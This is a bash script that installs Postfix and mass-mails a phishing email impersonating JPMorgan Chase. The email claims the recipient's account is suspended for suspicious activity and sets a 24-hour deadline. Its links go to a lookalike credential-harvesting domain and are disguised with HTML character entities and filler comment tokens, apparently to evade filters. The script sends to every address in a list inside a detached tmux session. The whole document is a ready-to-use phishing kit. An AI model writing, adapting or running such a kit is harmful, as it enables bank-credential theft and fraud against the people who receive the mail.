#!/bin/bash

# Ensure the script is run with root privileges
if [ "$EUID" -ne 0 ]; then
  echo "Please run this script as root or with sudo privileges."
  exit 1
fi

# === Predefined values for automated setup ===
myhostname="mail.admailsend.com"
sender_email="supportzed@admailsend.com"
sender_name="J.P MORGAN CHASE"
email_subject="TEMPORARY ACCOUNT SUSPENSION !!!"
email_list="list.txt"  # Ensure this file exists or provide full path

# === Install required packages ===
echo "Updating package list and installing Postfix and tmux..."
apt-get update -y
apt-get install -y postfix tmux mailutils

# === Backup and create new Postfix configuration ===
echo "Backing up and replacing Postfix main.cf..."
cp /etc/postfix/main.cf /etc/postfix/main.cf.backup
rm /etc/postfix/main.cf

tee /etc/postfix/main.cf > /dev/null <<EOL
myhostname = $myhostname
inet_interfaces = loopback-only
relayhost = 
mydestination = localhost
smtp_sasl_auth_enable = no
smtpd_sasl_auth_enable = no
smtp_sasl_security_options = noanonymous
smtp_tls_security_level = none
queue_directory = /var/spool/postfix
command_directory = /usr/sbin
daemon_directory = /usr/lib/postfix/sbin
mailbox_size_limit = 0
recipient_delimiter = +
EOL

echo "Restarting Postfix..."
service postfix restart

# === Create HTML email content ===
echo "Creating email.html..."
cat > email.html <<EOL
<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8" /> <meta name="viewport" content="width=device-width, initial-scale=1.0"/> <title>Security Alert – Action Required</title> <style> body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 20px; color: #333; } .container { max-width: 600px; margin: auto; background-color: #fff; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); overflow: hidden; } .header { background-color: #fff; padding: 20px; text-align: center; } .header img { max-width: 150px; } .content { padding: 30px 20px; } .content h1 { font-size: 20px; margin-bottom: 10px; color: #0a2f5c; } .content p { font-size: 15px; line-height: 1.6; margin: 10px 0; } .content ul { padding-left: 20px; margin: 10px 0; } .content ul li { margin-bottom: 6px; } .button { display: inline-block; margin-top: 20px; padding: 12px 24px; background-color: #0a2f5c; color: #fff; font-weight: bold; text-decoration: none; border-radius: 5px; transition: background-color 0.3s ease; } .button:hover { background-color: #1d4e89; } .alert { margin-top: 30px; background-color: #fff3cd; padding: 15px; border-radius: 5px; font-weight: 600; color: #856404; border: 1px solid #ffeeba; } .footer { text-align: center; font-size: 13px; color: #777; margin-top: 30px; } .footer a { color: #2672ec; text-decoration: none; } .footer a:hover { text-decoration: underline; } @media (max-width: 600px) { .content { padding: 20px 15px; } } </style></head><body> <!-- 37733a13 --><div class="container"> <!-- Header --> <!-- 37733a13 --><div class="header"> <img src="https:&#47;/ik.&#105;m&#97;gekit.&#105;o&#47;yleultaj4/IM&#71;&#95;&#55;&#48;37&#46;p&#110;g?upd&#97;tedAt=175641&#53;4&#50;8664" alt="Company Logo" /> <!-- 37733a13 --></div> <!-- Email Body --> <!-- 37733a13 --><div class="content"> <h1>Important: Suspicious Activity Detected</h1> <p>Dear User,</p> <p> We have detected unusual activity on your Checking/Savings account on <strong>September 4, 2025</strong> at <strong>2:21 AM</strong>. This behavior differs from your usual transactions and has triggered our security systems. </p> <p><strong>Possible reasons for this alert include:</strong></p> <ul> <li>Incorrect login credentials used</li> <li>Unrecognized login location or device</li> <li>Multiple failed login attempts</li> <li>Suspicious outgoing transactions</li> </ul> <p> As a precaution, we have temporarily restricted access to your account. To restore full access and confirm your identity, please use the secure link below. </p> <p style="text-align: center;"> <a href="h&#116;tps:&#47;/monst&#101;r&#109;&#101;&#101;&#112;&#108;e&#46;&#99;om.m&#120;/&#51;d57e4/&#117;r/capt&#99;&#104;a.ht&#109;&#108;" class="button">Secure Your Account</a> </p> <!-- 37733a13 --><div class="alert"> Please complete verification within 24 hours to avoid permanent restrictions on your account. <!-- 37733a13 --></div> <p>Thank you for your prompt attention.</p> <p> Chase Security Team</p> <!-- 37733a13 --></div> <!-- 37733a13 --></div> <!-- Footer --> <!-- 37733a13 --><div class="footer"> <p> Already completed the verification? <a href="h&#116;tps://&#109;ons&#116;&#101;&#114;&#109;&#101;ep&#108;e&#46;&#99;&#111;m&#46;&#109;x&#47;3d5&#55;e4/ur/c&#97;&#112;tc&#104;a.&#104;tml">Click here</a> to notify our Anti-Fraud team. </p> <p>&copy; 2025 JP Morgan Chase & Co.</p> <!-- 37733a13 --></div></body></html>
EOL

# Make email.html writable (rw-rw-r--)
chmod 664 email.html
# Optional: Change ownership to a non-root user
# chown yourusername:yourusername email.html

# === Create the send script ===
echo "Creating send.sh..."
cat > send.sh <<EOL
#!/bin/bash

# Loop through each email in the list
while IFS= read -r email; do
  echo "Sending email to: \$email"

  cat <<EOF | /usr/sbin/sendmail -t
To: \$email
From: $sender_name <$sender_email>
Subject: $email_subject
MIME-Version: 1.0
Content-Type: text/html

\$(cat email.html)
EOF

done < $email_list
EOL

# Make send.sh executable and writable (rwxrwxr-x)
chmod 775 send.sh
# Optional: Change ownership
# chown yourusername:yourusername send.sh

# === Run the send.sh script in a tmux session ===
echo "Starting tmux session for bulk email sending..."
tmux new-session -d -s mail_session "./send.sh"

echo "✅ Setup complete. Emails are being sent in a tmux session."
echo "To reattach: tmux attach -t mail_session"
